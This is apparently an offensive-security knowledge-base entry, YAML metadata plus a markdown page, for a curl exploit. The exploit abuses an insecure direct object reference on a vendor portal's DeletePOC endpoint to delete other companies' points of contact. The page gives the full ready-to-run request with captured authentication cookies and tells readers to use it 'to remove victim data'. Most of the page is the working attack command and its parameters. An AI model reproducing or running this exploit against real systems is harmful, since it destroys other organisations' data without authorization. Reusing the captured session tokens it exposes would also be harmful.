---
data: >-
  curl -i -s -k -X $'POST' -H $'Host: ████' -H $'User-Agent: Mozilla/5.0
  (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0' -H
  $'Accept: */*' -H $'Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3' -H
  $'Accept-Encoding: gzip, deflate' -H $'Content-Type:
  application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Csrf-Token:
  █████████' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 26' -H
  $'Origin: https://████' -H $'Referer: █████████/Vendor/Company/Profile/129111'
  -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site:
  same-origin' -H $'Te: trailers' -H $'Connection: close' -b
  $'.AspNetCore.Antiforgery.wZhPOrJ1UhI=CfDJ8LTOEQjKnQRBhUKhTTOOit8CeSwiAzq1rveGhuP0xQJ5zgfDGoJhSN6xIO-5u9EUQW57_fcCBFDd5aabeWVSnSE7i40fuT7qOiTJ0fZ8qw_IoDW-NmNoSenQyHUXbO2KqEuvWN3Hi-7rR_UoLKZqGGM;
  TS014b77bb=01d263603a810528ade1b657e0385976b5acd6fdc2c03362a92881cea479e86280aaf5a469e93b2f6f255bd8b8a367ed9ad90941256753f414e03329b77cfc14c5f046bbb63a756384e7f686dcfd142272a7a8cf488f236de71dbe9bfe918979628567f86ddbb13b932bb4a1cb8d55f463ef78a133;
  .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8LTOEQjKnQRBhUKhTTOOit_o0TeUroaEAfgtmMiCa9fB4ObkOQhAfzgbc17DvUpI3wVOOvZaUjZ0GHZjA5nJuRn5ludklhmtQqTGTIdAitoOIOLricizg2OBd4sIb6PTerrkyyQL7lRWF8Q4qMvy50qDCo1yPExe71j6qQ2gnE6ryKPk1vs-FWBOnWnEb9-qBUbzIyQ-K1gB51gQS0TeD__K0b5byVkJbIjca8Sd7Yq5;
  .AspNetAuth=CfDJ8LTOEQjKnQRBhUKhTTOOit8Vdo3-_HKifEFVq5lbA8g8edNiFpe0cQuw2M-osgD16XeoIdxnkoUIiqHwZjDMYf5rKsQYkLtHxtKtol2HRQ6EzODg4Yffc49tYIb-OfSuLj34UNgPo0Qm2F95pjXcsWjZ_jv_YEC2cZ67FH_mZsw7_QnC345IyWnHp5Le0bppltpp06x4dnoxK1Fo89-60U5G-suswckXhTLfkOw3xw2kc4DQssSKyBcr5aQJEmhRwfDmmQN2mqeXYG-6-w7jtsam5hCx1u1yN4U6Ar9JIbipRrBYk2r7pdWGuHkFNZDIqQ;
  TS0144f203=01d263603a05a2c5a6860e2c7c0c412143fc7375fa739551ff09b8936241b33c09409383f587d9d22cf5dd3d2595d7b49431eadd7e5c228e7c5bf79ab734ee800d7772dd6792ca46e6d2f8cc20a6a5829e3ba369d60624352c46436b3621ce4cba36f79b1259e316e3742fa232790b49b7b52ab68120104a99c4f3025c9aa65507f72c8212ce22cb19ff62a406ca448b7bde696749;
  CSRF-TOKEN=<yourtoken>' --data-binary $'pocId=<yourid>&disabled=false'
  $'██████████████/Vendor/Company/Contacts/DeletePOC'
tags:
  - web-exploit
  - idor
  - deletion
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.292Z'
id: f7f47fec-fb0b-4050-9388-20218c043efe
verified: false
validated: true
submitted: true
---
# curl-delete-poc-contact

## Command

```bash
curl -i -s -k -X $'POST' -H $'Host: ████' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0' -H $'Accept: */*' -H $'Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Csrf-Token: █████████' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 26' -H $'Origin: https://████' -H $'Referer: █████████/Vendor/Company/Profile/129111' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' -H $'Connection: close' -b $'.AspNetCore.Antiforgery.wZhPOrJ1UhI=CfDJ8LTOEQjKnQRBhUKhTTOOit8CeSwiAzq1rveGhuP0xQJ5zgfDGoJhSN6xIO-5u9EUQW57_fcCBFDd5aabeWVSnSE7i40fuT7qOiTJ0fZ8qw_IoDW-NmNoSenQyHUXbO2KqEuvWN3Hi-7rR_UoLKZqGGM; TS014b77bb=01d263603a810528ade1b657e0385976b5acd6fdc2c03362a92881cea479e86280aaf5a469e93b2f6f255bd8b8a367ed9ad90941256753f414e03329b77cfc14c5f046bbb63a756384e7f686dcfd142272a7a8cf488f236de71dbe9bfe918979628567f86ddbb13b932bb4a1cb8d55f463ef78a133; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8LTOEQjKnQRBhUKhTTOOit_o0TeUroaEAfgtmMiCa9fB4ObkOQhAfzgbc17DvUpI3wVOOvZaUjZ0GHZjA5nJuRn5ludklhmtQqTGTIdAitoOIOLricizg2OBd4sIb6PTerrkyyQL7lRWF8Q4qMvy50qDCo1yPExe71j6qQ2gnE6ryKPk1vs-FWBOnWnEb9-qBUbzIyQ-K1gB51gQS0TeD__K0b5byVkJbIjca8Sd7Yq5; .AspNetAuth=CfDJ8LTOEQjKnQRBhUKhTTOOit8Vdo3-_HKifEFVq5lbA8g8edNiFpe0cQuw2M-osgD16XeoIdxnkoUIiqHwZjDMYf5rKsQYkLtHxtKtol2HRQ6EzODg4Yffc49tYIb-OfSuLj34UNgPo0Qm2F95pjXcsWjZ_jv_YEC2cZ67FH_mZsw7_QnC345IyWnHp5Le0bppltpp06x4dnoxK1Fo89-60U5G-suswckXhTLfkOw3xw2kc4DQssSKyBcr5aQJEmhRwfDmmQN2mqeXYG-6-w7jtsam5hCx1u1yN4U6Ar9JIbipRrBYk2r7pdWGuHkFNZDIqQ; TS0144f203=01d263603a05a2c5a6860e2c7c0c412143fc7375fa739551ff09b8936241b33c09409383f587d9d22cf5dd3d2595d7b49431eadd7e5c228e7c5bf79ab734ee800d7772dd6792ca46e6d2f8cc20a6a5829e3ba369d60624352c46436b3621ce4cba36f79b1259e316e3742fa232790b49b7b52ab68120104a99c4f3025c9aa65507f72c8212ce22cb19ff62a406ca448b7bde696749; CSRF-TOKEN=<yourtoken>' --data-binary $'pocId=<yourid>&disabled=false' $'██████████████/Vendor/Company/Contacts/DeletePOC'
```

## Description

This curl command sends a POST request to delete a point of contact (POC) from a company profile, exploiting IDOR by targeting any pocId without authorization checks. Use in authenticated sessions to remove victim data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `pocId` | The ID of the contact to delete (victim's pocId) | Yes |
| `disabled` | Flag set to false (possibly indicates active deletion) | Yes |
| CSRF-TOKEN | Valid token from session | Yes |
| Cookies | Full auth cookies including .AspNetAuth | Yes |

## Examples

### Basic Usage

```bash
curl ... --data-binary $'pocId=123&disabled=false' $'https://target/Vendor/Company/Contacts/DeletePOC'
```

### Advanced Usage

Include full headers and cookies as captured from Burp for realism.

## Expected Output

HTTP 200 OK with success message or empty body if deletion succeeds; 403/500 if unauthorized or invalid.

## Related

- [[procedures/Exploit-IDOR-for-Contact-Deletion]]
- [[tools/Burp-Suite]]
